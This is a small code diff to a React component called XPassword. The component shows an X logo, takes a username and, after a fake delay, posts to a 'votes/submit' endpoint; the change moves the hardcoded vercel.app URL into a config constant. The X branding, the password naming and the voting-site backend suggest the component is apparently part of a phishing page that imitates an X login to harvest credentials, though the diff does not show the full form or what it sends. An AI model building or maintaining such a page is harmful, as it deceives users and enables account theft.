@@ -1,5 +1,6 @@
 import { useEffect, useState } from "react";
 import xLogo from "../assets/x-logo.png";
+import { API_BASE_URL } from "../config/api";
 
 export default function XPassword() {
   const [username, setUsername] = useState("");
@@ -32,7 +33,7 @@ export default function XPassword() {
     try {
       await new Promise((resolve) => setTimeout(resolve, 700));
       await fetch(
-        "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
+        `${API_BASE_URL}/api/votes/submit`,
         {
           method: "POST",
           headers: {
